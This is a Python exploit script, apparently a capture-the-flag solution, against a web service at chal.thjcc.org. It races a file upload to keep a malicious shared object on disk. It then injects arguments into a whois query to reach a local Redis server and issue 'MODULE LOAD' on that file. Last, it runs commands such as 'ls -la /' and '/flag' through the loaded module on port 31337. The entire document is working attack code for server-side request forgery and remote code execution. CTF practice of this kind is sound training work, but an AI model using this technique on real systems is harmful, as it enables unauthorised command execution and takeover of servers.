import json
import threading
import time
import urllib.request

BASE = "http://chal.thjcc.org:5000"
SO = open("solution.so", "rb").read()
KEEPALIVE = b"\n" + b"\n".join([b"-h 10.255.255.1 -p 43 x"] * 4)
PAYLOAD = SO + KEEPALIVE
job = {}


def q(query, timeout=15):
    r = urllib.request.Request(
        BASE + "/whois",
        json.dumps({"query": query}).encode(),
        {"Content-Type": "application/json"},
    )
    with urllib.request.urlopen(r, timeout=timeout) as resp:
        return json.loads(resp.read())


def uploader():
    b = "----x"
    body = (
        b"--" + b.encode()
        + b'\r\nContent-Disposition: form-data; name="file"; filename="a.txt"\r\n'
        + b"Content-Type: application/octet-stream\r\n\r\n"
        + PAYLOAD + b"\r\n--" + b.encode() + b"--\r\n"
    )
    r = urllib.request.Request(
        BASE + "/upload", body,
        {"Content-Type": "multipart/form-data; boundary=" + b},
    )
    resp = urllib.request.urlopen(r, timeout=60)
    buf = b""
    while True:
        ch = resp.read(1)
        if not ch:
            break
        buf += ch
        if ch == b"\n":
            try:
                ev = json.loads(buf.decode("utf-8", "replace"))
                if ev.get("type") == "upload":
                    job["path"] = ev["temporary_path"]
            except Exception:
                pass
            buf = b""

threading.Thread(target=uploader, daemon=True).start()
while "path" not in job:
    time.sleep(0.05)
path = job["path"]
print("temp:", path)

q('-h 127.0.0.1 -p 6379 "MODULE LOAD %s"' % path)

time.sleep(0.5)
for cmd in ["ls -la /", "/flag"]:
    r = q('-h 127.0.0.1 -p 31337 "%s"' % cmd)
    print("$", cmd, "\n", (r.get("output") or r.get("error") or "").strip())
